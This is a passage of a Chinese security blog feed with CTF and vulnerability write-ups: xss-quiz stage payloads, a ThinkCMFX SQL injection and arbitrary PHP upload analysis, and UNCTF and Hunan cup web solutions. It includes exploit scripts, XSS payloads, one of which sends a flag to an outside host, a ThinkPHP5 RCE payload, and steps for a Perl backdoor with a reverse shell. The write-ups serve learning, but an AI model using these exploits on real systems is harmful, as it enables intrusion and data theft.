zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Content-Length</span>: 0<span class="hljs-attribute">Content-Length</span>: 0</code></pre><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs php">import socketimport stringurl = <span class="hljs-string">"111.186.57.43"</span>port = <span class="hljs-number">10601</span>flag = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    <span class="hljs-keyword">for</span> j in string.printable:        s = socket.socket()        s.connect((url, port))        s.settimeout(<span class="hljs-number">3</span>)        data = <span class="hljs-string">"GET /?age=0 or ascii(substr((select flag_32122 from flag_xdd),"</span>.replace(<span class="hljs-string">" "</span>,<span class="hljs-string">"%20"</span>)+str(i)+<span class="hljs-string">",1))="</span>+str(ord(j))+<span class="hljs-string">" and sleep(10) HTTP/1.1\r\nHost:111.186.57.43:10601\r\nConnection:close\r\nContent-Length:0\r\nContent-Length:0\r\n\r\n"</span>.replace(<span class="hljs-string">" "</span>,<span class="hljs-string">'%20'</span>)        <span class="hljs-keyword">print</span> data        s.send(data)        <span class="hljs-keyword">try</span>:            s.recv(<span class="hljs-number">1024</span>)            s.close()        except:            flag = flag + chr(j)            <span class="hljs-keyword">print</span> flag            s.close()            <span class="hljs-keyword">break</span></code></pre><h1 id="ezjava未解决"><a href="#ezjava未解决" class="headerlink" title="ezjava未解决"></a>ezjava未解决</h1><p>貌似考察fastjson反序列化漏洞不会，考完试在研究</p><h1 id="ezcms未解决"><a href="#ezcms未解决" class="headerlink" title="ezcms未解决"></a>ezcms未解决</h1><p><img src="./1574339772748.png" srcset="/img/loading.gif" alt="1574339772748"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用肝刷xss-quiz</title>
    <link href="/2019/11/19/%E7%94%A8%E8%82%9D%E5%88%B7xss-quiz/"/>
    <url>/2019/11/19/%E7%94%A8%E8%82%9D%E5%88%B7xss-quiz/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刷刷xss, have fun…</p><p>项目地址：<a href="http://xss-quiz.int21h.jp" target="_blank" rel="noopener">http://xss-quiz.int21h.jp</a></p><h1 id="Stage-1"><a href="#Stage-1" class="headerlink" title="Stage 1"></a>Stage 1</h1><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">'1'</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">"alert(document.domain)"</span> /&gt;</code></pre><p><img src="./1574162948791.png" srcset="/img/loading.gif" alt="1574162948791"></p><h1 id="Stage-2"><a href="#Stage-2" class="headerlink" title="Stage 2"></a>Stage 2</h1><p><code>&lt;img src=&quot;&quot; onerror=&quot;alert(document.domain)&quot;/&gt;</code> 被放置在value中直接闭合即可</p><pre><code class="hljs js"><span class="hljs-string">"&gt;&lt;img src='' onerror="</span>alert(<span class="hljs-built_in">document</span>.domain)<span class="hljs-string">" /&gt;&lt;id="</span><span class="hljs-number">1</span><span class="hljs-string">"&gt;&lt;img src='' onerror="</span>alert(<span class="hljs-built_in">document</span>.domain)<span class="hljs-string">" /&gt;//</span></code></pre><p><img src="./1574163078341.png" srcset="/img/loading.gif" alt="1574163078341"></p><h1 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage 3"></a>Stage 3</h1><p>输入123显示在b标签中</p><p><img src="./1574163887664.png" srcset="/img/loading.gif" alt="1574163887664"></p><p>尝试闭合b标签</p><pre><code class="hljs js"><span class="hljs-number">123</span><span class="hljs-string">"&lt;/b&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;//</span></code></pre><p><code>&lt;</code>，<code>&#39;</code>1被实体编码</p><p><img src="./1574164588585.png" srcset="/img/loading.gif" alt="1574164588585"></p><p>国家选择处，没有进行html实体编码,</p><p><img src="./1574164982695.png" srcset="/img/loading.gif" alt="1574164982695"></p><h1 id="Stage-4"><a href="#Stage-4" class="headerlink" title="Stage 4"></a>Stage 4</h1><p>交互发送了三个参数，p1,p2都实体编码了</p><p><img src="./1574165349853.png" srcset="/img/loading.gif" alt="1574165349853"></p><p>找p3进行利用</p><pre><code class="hljs js"><span class="hljs-string">"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;id="</span></code></pre><p><img src="./1574166232566.png" srcset="/img/loading.gif" alt="1574166232566"></p><h1 id="Stage-5"><a href="#Stage-5" class="headerlink" title="Stage 5"></a>Stage 5</h1><pre><code class="hljs xml">"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.domain)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id="</span></span></code></pre><p><img src="./1574166457022.png" srcset="/img/loading.gif" alt="1574166457022"></p><h1 id="Satage-6"><a href="#Satage-6" class="headerlink" title="Satage 6"></a>Satage 6</h1><p><code>&lt;</code>被实体编码</p><p><img src="./1574166553095.png" srcset="/img/loading.gif" alt="1574166553095"></p><p>想着编码绕过，但是<code>\</code>被吃掉</p><p>考点是input中事件执行xss,得需要考虑自动触发，要不做出来也没打意义，如下payload能够自动触发xss</p><p>参考链接：<a href="http://suroot.cn/106.html" target="_blank" rel="noopener">http://suroot.cn/106.html</a></p><pre><code class="hljs js"><span class="hljs-string">" autofocus onfocus="</span>alert(<span class="hljs-built_in">document</span>.domain)</code></pre><p>再提几个需要条件触发xss</p><p>参考链接：<a href="https://hpdoger.cn/2018/08/02/xss%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%EF%BC%88%E4%BA%8C%EF%BC%89%E4%B9%8B%E6%80%92%E5%88%B7xss-quiz/#challenge3-%E5%85%B6%E5%AE%83input%E6%A1%86%E7%9A%84xss" target="_blank" rel="noopener">https://hpdoger.cn/2018/08/02/xss%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%EF%BC%88%E4%BA%8C%EF%BC%89%E4%B9%8B%E6%80%92%E5%88%B7xss-quiz/#challenge3-%E5%85%B6%E5%AE%83input%E6%A1%86%E7%9A%84xss</a></p><pre><code class="hljs js">鼠标向上移动触发js事件：<span class="hljs-string">"onmouseover="</span>alert(<span class="hljs-built_in">document</span>.domain)<span class="hljs-string">",onmouseover要脱离引号，alert在引号内。</span><span class="hljs-string"></span><span class="hljs-string">鼠标点击触发js事件："</span>onclick=<span class="hljs-string">"alert(document.domain)"</span>事件会在页面或图像加载完成后立即发生:onload=<span class="hljs-string">"alert(document.domain)"</span></code></pre><h1 id="Stage-7"><a href="#Stage-7" class="headerlink" title="Stage 7"></a>Stage 7</h1><p>过滤：<code>&lt;</code>,<code>&gt;</code>,<code>\</code></p><pre><code class="hljs coq">添加：　空格＋符号=&gt;符号=<span class="hljs-string">""</span>   符号=<span class="hljs-number">123</span> =&gt;符号=<span class="hljs-string">"123"</span></code></pre><p>不能用单引号去闭合，这里自动触发xss行不通，只能靠特定条件触发xss</p><p>payload:</p><pre><code class="hljs basic"><span class="hljs-symbol">123 </span>onclick=alert(document.domain)</code></pre><h1 id="Stage-8"><a href="#Stage-8" class="headerlink" title="Stage 8"></a>Stage 8</h1><p>考察javascript伪协议</p><p>payload</p><pre><code class="hljs js">javascript:alert(<span class="hljs-built_in">document</span>.domain)</code></pre><p><img src="./1574169016656.png" srcset="/img/loading.gif" alt="1574169016656"></p><h1 id="Stage-9"><a href="#Stage-9" class="headerlink" title="Stage 9"></a>Stage 9</h1><p>交换过程中发送编码形式</p><p><img src="./1574169121713.png" srcset="/img/loading.gif" alt="1574169121713"></p><p>利用utf-7编码</p><p>参考链接：<a href="https://sakurasec.com/utf-7-xss/" target="_blank" rel="noopener">https://sakurasec.com/utf-7-xss/</a></p><p><img src="./1574169554612.png" srcset="/img/loading.gif" alt="1574169554612"></p><p>但是现在浏览器不支持utf-7，跳过该题目</p><h1 id="Stage-10"><a href="#Stage-10" class="headerlink" title="Stage 10"></a>Stage 10</h1><p>过滤了domain关键字，使用html实体编码绕过</p><pre><code class="hljs js"><span class="hljs-string">"&gt;&lt;img src='' onerror="</span>alert(<span class="hljs-built_in">document</span>.domdomainain)<span class="hljs-string">" /&gt;&lt;id="</span>"&gt;&lt;img src='' onerror="alert(document.&amp;#100;&amp;#111;&amp;#109;&amp;#97;&amp;#105;&amp;#110;)" /&gt;&lt;id="                             <span class="hljs-string">"&gt;&lt;img src='' onerror=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)) /&gt;&lt;id="</span></code></pre><p><img src="./1574171624594.png" srcset="/img/loading.gif" alt="1574171624594"></p><h1 id="Stage-11"><a href="#Stage-11" class="headerlink" title="Stage 11"></a>Stage 11</h1><p>过滤替换</p><pre><code class="hljs js"><span class="hljs-string">"s/script/xscript/ig;"</span> and <span class="hljs-string">"s/on[a-z]+=/onxxx=/ig;"</span> and <span class="hljs-string">"s/style=/stxxx=/ig;"</span></code></pre><p>这里考虑使用html编码构造事件，但是浏览器在解析DOM树是不对html编码进行解码．只能考虑在属性中利用</p><p>利用javascript伪协议,在属性中进行编码，浏览器在解析完成dom树之后，执行js代码，会进行编码转换</p><pre><code class="hljs gcode"><span class="hljs-string">"&gt;&lt;a href="</span>java&amp;<span class="hljs-attr">#115</span>;&amp;<span class="hljs-attr">#99</span>;&amp;<span class="hljs-attr">#114</span>;ipt:alert<span class="hljs-comment">(document.domain)</span><span class="hljs-string">"&gt;&lt;id="</span></code></pre><p><img src="./1574172129542.png" srcset="/img/loading.gif" alt="1574172129542"></p><h1 id="Stage-12"><a href="#Stage-12" class="headerlink" title="Stage 12"></a>Stage 12</h1><p>过滤</p><pre><code class="hljs js"><span class="hljs-string">"s/[\x00-\x20\&lt;\&gt;\"\']//g;"</span></code></pre><p>过滤双引号，必须构造双引号闭合标签,利用html实体编码，浏览器解码后会认为该双引号为字符型，无法逃逸.</p><p> 但更恶心是<code>&lt;</code>被过滤，其他wp都是基于iE浏览器意义不大．</p><p>13-14关也是针对IE浏览器，跳过</p><h1 id="Stage-15"><a href="#Stage-15" class="headerlink" title="Stage 15"></a>Stage 15</h1><p>输出内容是经过<code>document.write(&quot;内容&quot;)</code>输出到value中，</p><p><img src="./1574172804310.png" srcset="/img/loading.gif" alt="1574172804310"></p><p>直接构造标签输出到value,<code>&lt;,&quot;</code>会被转义,</p><p><img src="./1574173073762.png" srcset="/img/loading.gif" alt="1574173073762"></p><p>既然是在js中执行，考虑unicode绕过,后端php会执行stripslashes过滤<code>\</code>双写即可绕过</p><pre><code class="hljs js">\\u003cscript\\u003ealert(<span class="hljs-built_in">document</span>.domain);\\u003c/script\\u003e\\x3cscript\\x3ealert(<span class="hljs-built_in">document</span>.domain);\\x3c/script\\x3e</code></pre><p>​    </p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>考虑送至后端的参数，可能存在你在浏览器不能输入，但是可控，抓包查看．</li><li>考虑浏览器解析html先后顺序，利用该差异，应用不同的编码绕过</li><li>一般情况下<code>&lt;,&gt;,\,&quot;</code> 就x不起来了</li><li>开f12做题有惊喜</li><li>关注meta属性</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>历史漏洞分析之ThinkCMFX(一)</title>
    <link href="/2019/11/16/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BThinkCMFX-%E4%B8%80/"/>
    <url>/2019/11/16/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BThinkCMFX-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><blockquote><p>php5.6+ThinkCMFX 2.3.3+debian</p></blockquote><h1 id="前台SQL注入"><a href="#前台SQL注入" class="headerlink" title="前台SQL注入"></a>前台SQL注入</h1><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ThinkCMFX/index.php?g=portal&amp;m=article&amp;a=edit_post</span> HTTP/1.1<span class="hljs-attribute">Host</span>: localhost<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Cookie</span>: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span>: 79post[id][0]=bind&amp;post[id][1]=0 and updatexml(1, concat(0x7e,user(),0x7e),1)--+-</code></pre><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>Thinkphp3.x SQL一大鸡肋之处就是需要where函数可控，ThinkCMF可以SQL注入，就是利用调用where函数之处参数可控。当然在框架下的基本都是PDO调用可利用可以多考虑多语句注入，注意编译报错、绑定错误导致注入失败。</p><p>还有许多地方有sql注入，就不一一分析，原理相似。具体见：<a href="https://github.com/thinkcmf/cmfx/issues/26" target="_blank" rel="noopener">https://github.com/thinkcmf/cmfx/issues/26</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>I方法解析POST方式传入的参数，赋值给$article并取出’id’键，传入where函数中</p><p><img src="./1573900690937.png" srcset="/img/loading.gif" alt="1573900690937"></p><p>where函数将传入的参数赋值到<code>options[&#39;where&#39;</code>],返回<code>options</code></p><p><img src="./1573902053580.png" srcset="/img/loading.gif" alt="1573902053580"></p><p>接着调用<code>save</code>函数，再调用<code>update</code>函数.接着进入parseWhereItem函数，满足<code>&#39;bind&#39;==$exp</code>直接拼接<code>0+and+(updatexml(1,concat(0x7e,(select database()),0x7e),1))</code>.</p><p><img src="./1573900090545.png" srcset="/img/loading.gif" alt=" 1573900090545"></p><p>最后将拼接完的sql语句，传入execute方法执行.成功进行预编译、参数绑定</p><p>/ThinkCMFX/simplewind/Core/Library/Think/Db/Driver.class.php</p><p><img src="./1573902382521.png" srcset="/img/loading.gif" alt="1573902382521"></p><h1 id="前台任意文件上传"><a href="#前台任意文件上传" class="headerlink" title="前台任意文件上传"></a>前台任意文件上传</h1><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/cms/ThinkCMFX/index.php?g=Asset&amp;m=Ueditor&amp;a=upload&amp;action=uploadfile</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 127.0.0.1<span class="hljs-attribute">Cookie</span>: PHPSESSID=3s9fhojod2n1op7esv3e6gab91<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Pragma</span>: no-cache<span class="hljs-attribute">Cache-Control</span>: no-cache<span class="hljs-attribute">Content-Length</span>: 235<span class="hljs-attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------4714631421141173021852555099-----------------------------4714631421141173021852555099<span class="hljs-attribute">Content-Disposition</span>: form-data; name="file"; filename="shell.php"<span class="hljs-attribute">Content-Type</span>: image/jpeg&lt;?php phpinfo();?&gt;-----------------------------4714631421141173021852555099--</code></pre><p><img src="./1573906050447.png" srcset="/img/loading.gif" alt="1573906050447"></p><h2 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>对错误管理并未直接Down掉程序,造成图片配置$config配置畸形.且存在二次赋值<code>$_FILES</code>也为前者图片配置构造畸形铺路</p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>传入<code>$filetype=&#39;file&#39;</code>,sp_get_upload_setting调用系统默认配置，$allowed_exts由于explode无法拆分二维数组报错返回NULL.</p><p><img src="./1573908023054.png" srcset="/img/loading.gif" alt="1573908023054"></p><p>代码继续往下执行，进入upload方法，观察第120行，如果参数不存在会直接赋值全局变量<code>$_FILES</code>，这也造成一定隐患。因为文件默认配置会放在ueditor_upload方法入口前几行，由于传入的<code>$_FILES</code>数组不符合参数规则，会造成报错，即后续$config配置会置为空</p><p><img src="./1573908369586.png" srcset="/img/loading.gif" alt="1573908369586"></p><p>继续跟进代码，在后续对后缀检测，由于$config[‘exts’]=NULL，即使文件为非法后遭”php”直接绕过检测</p><p><img src="./1573908792843.png" srcset="/img/loading.gif" alt="1573908792843"></p><p>在之后的文件名生成，调用uniqid方法生成文件名,可以通过多上传文件进行文件名字爆破</p><p><img src="./1573907345782.png" srcset="/img/loading.gif" alt="1573907345782"></p><p>最后调用save方法,<code>move_uploaded_file</code>保存文件.</p><p><img src="./1573909016008.png" srcset="/img/loading.gif" alt="1573909016008"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mochazz.github.io/2019/07/25/ThinkCMFX%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/25/ThinkCMFX%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019UNCTF 未解WEB复现填坑</title>
    <link href="/2019/11/14/2019UNCTF-%E6%9C%AA%E8%A7%A3WEB%E5%A4%8D%E7%8E%B0%E5%A1%AB%E5%9D%91/"/>
    <url>/2019/11/14/2019UNCTF-%E6%9C%AA%E8%A7%A3WEB%E5%A4%8D%E7%8E%B0%E5%A1%AB%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在复现这些未做出题目时候，感觉自己比赛时候还是不够细心，没有考虑出题人意图和其他漏洞点，看着是sql注入，就不去考虑其他漏洞利用方式。</p><h1 id="Arbi"><a href="#Arbi" class="headerlink" title="Arbi"></a>Arbi</h1><p>登录注册界面</p><p><img src="./1573556772013.png" srcset="/img/loading.gif" alt="1573556772013"></p><p>登录之后，服务端本地开启9000端口读取本地文件，路径依据注册的账号，可以便利目录读文件</p><p><img src="./1573556758357.png" srcset="/img/loading.gif" alt="1573556758357"></p><p>Express框架，读取<strong><a href="http://127.0.0.1:9000/upload/../package.json?.jpg" target="_blank" rel="noopener">http://127.0.0.1:9000/upload/../package.json?.jpg</a></strong></p><p><img src="./1573556592148.png" srcset="/img/loading.gif" alt="1573556592148"></p><p>后端使用jwt构造身份验证</p><p><img src="./1573565534827.png" srcset="/img/loading.gif" alt="1573565534827"></p><ol><li>利用express当传入algorithm为none，会使用algorithm none解密</li><li><code>var secret = global.secretlist[id];</code> 传入不存在的id，使得secret为undefined</li></ol><p><img src="./1573565835641.png" srcset="/img/loading.gif" alt="1573565835641"></p><p>在login界面增加伪造token，并登录,进入admin后台，session.name=’admin’，就能够访问admin23333_interface.js</p><p><img src="./1573566009065.png" srcset="/img/loading.gif" alt="1573566009065"></p><p><img src="./1573565975973.png" srcset="/img/loading.gif" alt="1573565975973"></p><p>admin23333_interface.js有个文件读取接口,参数可控</p><p><img src="./1573566045820.png" srcset="/img/loading.gif" alt="1573566045820"></p><p>用到两个trick:</p><ol><li>传入a[b]=1 会转为a={“b”:1}构造为对象，正则匹配无法识别对象，爆warnnig绕过第一个if</li><li>length不仅可以取字符串长度还可以取数组长度，把filename设数组，再配合下面的循环 即可完美绕过过滤 而express  中当碰到两个同名变量时，会把这个变量设置为数组，例如a=123&amp;a=456 解析后 a = [123,456]，所以最终组合成</li></ol><p><img src="./1573562632890.png" srcset="/img/loading.gif" alt="1573562632890"></p><p>payload:<code>&lt;http://183.129.189.60:10047/admin23333_interface?name[filename]=../&amp;name[filename]=f&amp;name[filename]=l&amp;name[filename]=a&amp;name[filename]=g&gt;</code></p><p><img src="./1573566304858.png" srcset="/img/loading.gif" alt="1573566304858"></p><h1 id="easyXSS"><a href="#easyXSS" class="headerlink" title="easyXSS"></a>easyXSS</h1><p>测试xss</p><pre><code class="hljs js">&lt;img src=<span class="hljs-string">'123'</span> onerror=<span class="hljs-string">'alert(1)'</span> &gt;</code></pre><p><img src="./1573567727736.png" srcset="/img/loading.gif" alt="1573567727736"></p><p><img src="./1573650330594.png" srcset="/img/loading.gif" alt="1573650330594"></p><p>Httponly限制了跨域请求，解决思路：开发者为了更好的支持跨域请求，引入了ajax。观察所有web界面ACL是否支持跨域请求且附带会附带cookie。其中最明显的是回显头显示允许X-Requests-with.</p><p>最好利用的是<code>http://112.74.37.15:8010/index.php/treehole/view</code> 响应头ACL显示支持<code>X-Requests-with</code>且带cookie</p><p><img src="./1573646018526.png" srcset="/img/loading.gif" alt="1573646018526"></p><p>payload</p><pre><code class="hljs 1c">&lt;img src='/efefefe' onerror=<span class="hljs-string">"xmlhttp=new</span>XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function()&#123;if(xmlhttp.readyState==<span class="hljs-number">4</span>)&#123;location.href='http://xss.zhaoj.in/?flag='+xmlhttp.responseText.match('flag\\&#123;(.\*?)\\&#125;')[<span class="hljs-number">1</span>]&#125;&#125;;xmlhttp.open('GET','/index.php/treehole/view?id=',true);xmlhttp.send('');<span class="hljs-string">"/\&gt;</span></code></pre><p><img src="./1573646485750.png" srcset="/img/loading.gif" alt="1573646485750"></p><h1 id="smile-doge"><a href="#smile-doge" class="headerlink" title="smile doge"></a>smile doge</h1><p>输入点存在ssrf,页面会嵌套<a href="http://127.0.0.1内容,再扫描端口发现9527也开放着" target="_blank" rel="noopener">http://127.0.0.1内容,再扫描端口发现9527也开放着</a></p><p><img src="./1573650428706.png" srcset="/img/loading.gif" alt="1573650428706"></p><p>扫描目录存在源码泄露/backup/.index.php.swp,源码为golang</p><pre><code class="hljs go"><span class="hljs-keyword">type</span> Page <span class="hljs-keyword">struct</span>&#123;Name <span class="hljs-keyword">string</span>Input <span class="hljs-keyword">string</span>&#125;<span class="hljs-keyword">type</span> Input <span class="hljs-keyword">struct</span>&#123;MyName <span class="hljs-keyword">string</span>MyRequest *http.Request&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sayhelloName</span><span class="hljs-params">(w http.ResponseWriter,r *http.Request)</span></span>&#123;w.Header().set(<span class="hljs-string">"X-Powered-By"</span>,<span class="hljs-string">"PHP/5.4.16"</span>)<span class="hljs-keyword">var</span> out bytes.Buffer<span class="hljs-keyword">var</span> response <span class="hljs-keyword">string</span>name := <span class="hljs-string">""</span>data,err := ioutil.ReadFile(<span class="hljs-string">"/flag"</span>)<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span>&#123;&#125;<span class="hljs-keyword">var</span> FLAG = <span class="hljs-keyword">string</span>(data)r.ParseForm()r.Header.Add(<span class="hljs-string">"FLAg"</span>, FLAG)<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.Header[])&gt;<span class="hljs-number">0</span>&#123;name = r.Header[<span class="hljs-string">"Logic"</span>][<span class="hljs-number">0</span>]&#125;<span class="hljs-keyword">else</span>&#123;name = <span class="hljs-string">"No.9527"</span>&#125;&#125;</code></pre><p>解读代码下，毕竟第一次接触go语言</p><p>开头定义两个结构体Page和Input，sayhelloName方法设置回显头和请求处理，重点关注flag位置，通过io流读取最后保存在FLAG变量中，最后会在请求时候带上。</p><p>传入<a href="http://127.0.0.1:9527回显`No.9527`,以上文件是该端口的备份文件没跑了。">http://127.0.0.1:9527回显`No.9527`,以上文件是该端口的备份文件没跑了。</a></p><p><img src="./1573660464066.png" srcset="/img/loading.gif" alt="1573660464066"></p><p>在看以下代码,另一个<code>r.Header[&quot;Logic&quot;][0]</code> 前端外带的数据为name值，如果此处可控，可以外带flag就完美了。</p><pre><code class="hljs go"><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.Header[])&gt;<span class="hljs-number">0</span>&#123;name = r.Header[<span class="hljs-string">"Logic"</span>][<span class="hljs-number">0</span>]&#125;<span class="hljs-keyword">else</span>&#123;name = <span class="hljs-string">"No.9527"</span>&#125;</code></pre><p><code>r.Header[&quot;Logic&quot;][0]</code>为获取请求头的<code>Logic</code>键,通过ssrf直接请求<a href="http://127.0.0.1:9527无法设置请求头，考虑CRLF注入.这里正好使用http包">http://127.0.0.1:9527无法设置请求头，考虑CRLF注入.这里正好使用http包</a>.</p><p><a href="https://github.com/golang/go/issues/30794" target="_blank" rel="noopener">https://github.com/golang/go/issues/30794</a></p><p><img src="./1573661068540.png" srcset="/img/loading.gif" alt="1573661068540"></p><p>接下就是外带flag问题了，以上代码分析，flag是会被读取到http.Request中，而又存在一个可疑的结构体MyRequest对象,</p><p>应该是调用该方法时候传入的对象.</p><pre><code class="hljs go"><span class="hljs-keyword">type</span> Input <span class="hljs-keyword">struct</span>&#123;MyName <span class="hljs-keyword">string</span>MyRequest *http.Request&#125;</code></pre><p>接着利用模板注入，外带出FLAG</p><pre><code class="hljs groovy"><span class="hljs-string">payload:</span>name=<span class="hljs-string">http:</span><span class="hljs-comment">//127.0.0.1:9527/? HTTP/1.1\r\nLogic: &#123;&#123;.MyRequest&#125;&#125;</span></code></pre><p><img src="./1573661507668.png" srcset="/img/loading.gif" alt="1573661507668"></p><h1 id="superxss-待学习补充"><a href="#superxss-待学习补充" class="headerlink" title="superxss(待学习补充)"></a>superxss(待学习补充)</h1><p><img src="./1573662778533.png" srcset="/img/loading.gif" alt="1573662778533"></p><p>访问后可得如下CSP</p><p>csp测试网站：<a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a></p><p><code>default-src &#39;self&#39; 183.129.189.60</code> =&gt; 只允许源183.129.189.60获取数据</p><p><code>script-src &#39;self&#39; &#39;unsafe-inline&#39;</code> =&gt;  允许使用内联 JavaScript 和 CSS。</p><p><code>object-src &#39;none&#39;</code> =&gt; 可对 Flash 和其他插件进行控制 不执行任何匹配</p><pre><code class="hljs php">Content-Security-Policy: <span class="hljs-keyword">default</span>-src <span class="hljs-string">'self'</span> <span class="hljs-number">183.129</span><span class="hljs-number">.189</span><span class="hljs-number">.60</span>;script-src <span class="hljs-string">'self'</span> <span class="hljs-string">'unsafe-inline'</span>;object-src <span class="hljs-string">'none'</span></code></pre><p>过滤字符</p><pre><code class="hljs autohotkey">' =&gt; ` 替代\过滤还过滤挺多事件onerror</code></pre><p>wp给了个bypass xss/csp，但是后门exp就不会写了，扔个坑</p><pre><code class="hljs js">&lt;frameset onpageshow =</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.ctfwp.com/articals/2019unctf.html" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019unctf.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019湖湘杯web部分题解</title>
    <link href="/2019/11/12/2019%E6%B9%96%E6%B9%98%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/11/12/2019%E6%B9%96%E6%B9%98%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>比赛很水，补一下残缺的wp</p><h1 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp?"></a>thinkphp?</h1><p>thinkphp5 rce</p><p>payload：</p><p>_method=__construct&amp;method=get&amp;filter[]=show_source&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=/flag</p><p><img src="./1573275207972.png" srcset="/img/loading.gif" alt="1573275207972"></p><h1 id="untar"><a href="#untar" class="headerlink" title="untar"></a>untar</h1><p>正解似乎是利用软链接获取flag，但是比赛没成功。参考链接：<a href="http://knqyf263.hatenablog.com/entry/2018/06/27/181037" target="_blank" rel="noopener">http://knqyf263.hatenablog.com/entry/2018/06/27/181037</a></p><p>这里用的是302跳转+perl 底层open触发命令执行</p><p><a href="https://1isten.xyz/2018/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9ssrf%E7%9A%84%E7%90%86%E8%A7%A3/" target="_blank" rel="noopener">https://1isten.xyz/2018/10/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9ssrf%E7%9A%84%E7%90%86%E8%A7%A3/</a></p><p>修改backdoor.txt,改下你需要监听的vps和端口</p><p><img src="./1573282266812.png" srcset="/img/loading.gif" alt="1573282266812"></p><p>写入后门</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">183.129</span>.<span class="hljs-number">189.62</span>:<span class="hljs-number">15207</span><span class="hljs-regexp">/?filename=URI/</span>listen.pm&amp;url=http:<span class="hljs-regexp">//</span>vps<span class="hljs-regexp">/backdoor.txt</span></code></pre><p>反弹ｓｈｅｌｌ</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">183.129</span>.<span class="hljs-number">189.62</span>:<span class="hljs-number">15207</span><span class="hljs-regexp">/?filename=xxx&amp;url=http:/</span><span class="hljs-regexp">/vps/</span><span class="hljs-number">302</span>.php</code></pre><p><img src="./1573282550159.png" 